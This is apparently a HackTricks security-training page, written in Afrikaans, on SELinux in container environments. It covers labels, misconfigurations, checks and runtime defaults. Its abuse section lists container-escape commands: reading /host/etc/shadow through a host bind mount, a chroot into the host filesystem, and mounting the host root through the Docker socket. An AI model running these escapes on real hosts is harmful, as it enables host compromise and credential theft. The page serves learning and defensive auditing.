# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Oorsig

SELinux is a **label-based Mandatory Access Control** stelsel. Elke relevante proses en objek kan 'n sekuriteitskonteks hê, en beleid bepaal watter domeine met watter tipes en op watter wyse mag interaksie hê. In gekonteinerde omgewings beteken dit gewoonlik dat die runtime die container-proses onder 'n ingeperkte container-domein begin en die containerinhoud met ooreenstemmende tipes merk. As die beleid behoorlik werk, kan die proses die dinge lees en skryf wat verwag word dat sy etiket sal raak, terwyl toegang tot ander host-inhoud ontken word, selfs al word daardie inhoud sigbaar deur 'n mount.

Dit is een van die kragtigste beskermings aan die gasheerkant wat beskikbaar is in mainstream Linux-container-implementasies. Dit is veral belangrik op Fedora, RHEL, CentOS Stream, OpenShift, en ander SELinux-gesentreerde ekosisteme. In daardie omgewings sal 'n beoordelaar wat SELinux ignoreer dikwels verkeerd verstaan waarom 'n voor die hand liggende paadjie na 'n kompromittering van die gasheer werklik geblokkeer is.

## AppArmor Vs SELinux

Die maklikste hoëvlakverskil is dat AppArmor padgebaseer is terwyl SELinux **label-based** is. Dit het groot gevolge vir container-sekuriteit. 'n Padgebaseerde beleid kan anders optree as dieselfde gasheerinhoud sigbaar word onder 'n onverwagte mount-pad. 'n **label-based** beleid vra eerder wat die objek se etiket is en wat die prosesdomein daaraan mag doen. Dit maak SELinux nie eenvoudig nie, maar dit maak dit robuust teen 'n klas van pad-triek-aanname wat verdedigers soms per ongeluk maak in AppArmor-gebaseerde stelsels.

Omdat die model etiket-georiënteerd is, is container-volumebehandeling en heretiketteringsbesluite sekuriteitskrities. As die runtime of operateur etikette te wyd verander om "mounts te laat werk", kan die beleidsgrens wat die werklading moes bevat, baie swakker word as beplan.

## Lab

Om te sien of SELinux op die gasheer aktief is:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Om bestaande etikette op die gasheer te inspekteer:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Om 'n normale uitvoering te vergelyk met een waarin etikettering gedeaktiveer is:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Op 'n SELinux-ondersteunde gasheer is dit 'n baie praktiese demonstrasie, omdat dit die verskil toon tussen 'n workload wat binne die verwagte container domain loop en een wat van daardie handhawingslaag ontneem is.

## Runtime Usage

Podman is besonder goed in lyn met SELinux op stelsels waar SELinux deel is van die platform-standaard. Rootless Podman plus SELinux is een van die sterkste hoofstroom container-baselines omdat die proses reeds sonder voorregte aan die gasheer-kant is en nog steeds deur MAC policy beperk word. Docker kan ook SELinux gebruik waar dit ondersteun word, alhoewel administrateurs dit soms deaktiveer om volume-labeling friction te omseil. CRI-O en OpenShift leun swaar op SELinux as deel van hul container isolasieverhaal. Kubernetes kan ook SELinux-verwante instellings blootstel, maar hul waarde hang uiteraard daarvan af of die node OS SELinux werklik ondersteun en afdwing.

Die terugkerende les is dat SELinux nie 'n opsionele garnering is nie. In die ekosisteme wat daaraan gebou is, is dit deel van die verwagte sekuriteitsgrens.

## Misconfigurations

Die klassieke fout is `label=disable`. Operationeel gebeur dit dikwels omdat 'n volume mount geweier is en die vinnigste korttermynoplossing was om SELinux uit die vergelyking te verwyder in plaas van die labeling-model reg te stel. Nog 'n algemene fout is onkorrekte relabeling van host-inhoud. Breë relabel-werke kan die toepassing laat werk, maar hulle kan ook uitbrei wat die container toegelaat word om aan te raak ver bo wat oorspronklik bedoel was.

Dit is ook belangrik om nie **geïnstalleerde** SELinux met **effektiewe** SELinux deurmekaar te haal nie. 'n Gasheer mag SELinux ondersteun en steeds in permissiewe modus wees, of die runtime mag nie die workload onder die verwagte domein begin nie. In daardie gevalle is die beskerming baie swakker as wat die dokumentasie mag aandui.

## Abuse

Wanneer SELinux afwesig, permissief, of breedweg gedeaktiveer is vir die workload, word gasheer-gemonteerde paadjies baie makliker om te misbruik. Dieselfde bind mount wat andersins deur labels beperk sou gewees het, kan 'n direkte kanaal na host-data of gasheer-wysiging word. Dit is veral relevant wanneer dit gekombineer word met writable volume mounts, container runtime directories, of operasionele kortpaaie wat sensitiewe host-paadjies vir gerief blootgestel het.

SELinux verduidelik dikwels waarom 'n generic breakout writeup onmiddellik op een host werk maar herhaaldelik op 'n ander misluk, al lyk die runtime flags soortgelyk. Die ontbrekende bestanddeel is dikwels nie 'n namespace of 'n capability nie, maar 'n label boundary wat intact gebly het.

Die vinnigste praktiese kontrole is om die aktiewe konteks te vergelyk en dan gemonteerde host-paadjies of runtime directories te ondersoek wat normaalweg deur labels beperk sou wees:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Indien 'n host bind mount teenwoordig is en SELinux-etikettering uitgeskakel of verswak is, kom inligtingsopenbaring dikwels eers voor:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
As die mount skryfbaar is en die container vanuit die kernel se oogpunt effektief host-root is, is die volgende stap om beheerde wysiging van die host te toets in plaas van te raai:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Op gashere met SELinux-ondersteuning kan die verlies van etikette rondom gidses wat runtime-toestand bevat ook direkte privilege-escalation-paaie blootstel:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Hierdie opdragte vervang nie 'n full escape chain nie, maar dit maak baie vinnig duidelik of SELinux die ding was wat host data access of host-side file modification verhinder het.

### Volledige Voorbeeld: SELinux Disabled + Writable Host Mount

As SELinux-labeling uitgeskakel is en die host filesystem by `/host` as geskryfbaar gemonteer is, word 'n full host escape 'n normale bind-mount abuse case:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
As die `chroot` slaag, werk die container-proses nou vanaf die gasheer-lêerstelsel:
```bash
id
hostname
cat /etc/passwd | tail
```
### Volledige Voorbeeld: SELinux uitgeschakel + Runtime Directory

As die workload 'n runtime socket kan bereik sodra labels uitgeschakel is, kan die escape aan die runtime gedelegeer word:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Die relevante waarneming is dat SELinux dikwels die kontrole was wat presies hierdie soort host-path of runtime-state toegang verhinder het.

## Kontroles

Die doel van die SELinux-kontroles is om te bevestig dat SELinux aangeskakel is, die huidige security context te identifiseer, en te kyk of die lêers of paaie wat vir jou van belang is inderdaad label-confined is.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Wat interessant is hier:

- `getenforce` behoort idealiter `Enforcing` terug te gee; `Permissive` of `Disabled` verander die betekenis van die hele SELinux-afdeling.
- As die huidige proses-konteks onverwags of te wyd lyk, mag die workload nie onder die beoogde containerbeleid loop nie.
- As host-gemonteerde lêers of runtime-gidse labels het waartoe die proses te vrylik toegang kan kry, word bind mounts veel gevaarliker.

Wanneer u 'n container op 'n SELinux-vaardige platform hersien, beskou etikettering nie as 'n sekondêre detail nie. In baie gevalle is dit een van die hoofredes waarom die gasheer nog nie gekompromitteer is nie.

## Standaardinstellings

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Host-afhanklik | SELinux-separasie is beskikbaar op SELinux-geaktiveerde hosts, maar die presiese gedrag hang af van host/daemon-konfigurasie | `--security-opt label=disable`, breë heretikettering van bind mounts, `--privileged` |
| Podman | Gewoonlik geaktiveer op SELinux-hosts | SELinux-separasie is 'n normale deel van Podman op SELinux-stelsels tensy gedeaktiveer | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Nie gewoonlik outomaties op Pod-vlak toegewys nie | SELinux-ondersteuning bestaan, maar Pods benodig gewoonlik `securityContext.seLinuxOptions` of platform-spesifieke verstekwaardes; runtime- en node-ondersteuning is nodig | swak of breë `seLinuxOptions`, hardloop op permissive/disabled nodes, platformbeleid wat etikettering deaktiveer |
| CRI-O / OpenShift style deployments | Word gewoonlik swaar vertrou | SELinux is dikwels 'n kernonderdeel van die node-isolasie-model in hierdie omgewings | aangepaste beleid wat toegang te wijd maak, etikettering deaktiveer vir verenigbaarheid |

SELinux-verstekwaardes is meer distribusie-afhanklik as seccomp-verstekwaardes. Op Fedora/RHEL/OpenShift-styl stelsels is SELinux dikwels sentraal tot die isolasiemodel. Op nie-SELinux-stelsels is dit eenvoudig afwesig.
{{#include ../../../../banners/hacktricks-training.md}}
